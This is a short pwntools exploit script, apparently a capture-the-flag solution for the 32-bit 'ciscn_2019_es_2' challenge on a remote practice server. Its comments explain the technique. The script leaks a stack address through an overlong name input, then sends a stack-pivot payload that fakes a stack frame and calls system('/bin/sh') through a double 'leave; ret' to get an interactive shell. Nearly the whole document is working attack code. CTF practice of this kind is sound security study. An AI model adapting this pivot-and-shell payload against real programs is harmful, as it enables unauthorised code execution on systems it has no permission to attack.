from pwn import *
context.arch='i386'

# the program has a function which call the system,
# but could not get shell by this function,
# meanwhile the length of input was limit to make rop list,
# but we can contrl stack by stack pivot(cover the value of ebp on stack),
# before that, we can leak a stack address by first input,
# and calculate the offset by leak data to forge a fake stack

p = remote('node3.buuoj.cn',26676)
# p = process('./ciscn_2019_es_2')
elf = ELF('./ciscn_2019_es_2',checksec=False)

p.recvuntil("What's your name?")
p.send('a'*(0x20+7)+'b')
p.recvuntil('b')
stack_addr = u32(p.recv(4))
log.success('stack_addr = %#x',stack_addr)

payload = 'a'*8 + p32(stack_addr -0x28) + p32(elf.sym['system']) + p32(elf.sym['main']) + p32(stack_addr-0x20) + '/bin/sh\x00'
payload = payload.ljust(0x28,'p') + p32(stack_addr-0x2c) # stack pivot
# the leak stack address is not the current function's ebp,
# need to debug for finding offset between leak stack and inputs on stack
# there are something need to look out,
# that could not to point to a stack address(system),
# we need to contrl stack,and get shell by 'leave ret'*2
p.send(payload)
sleep(1)
p.interactive()
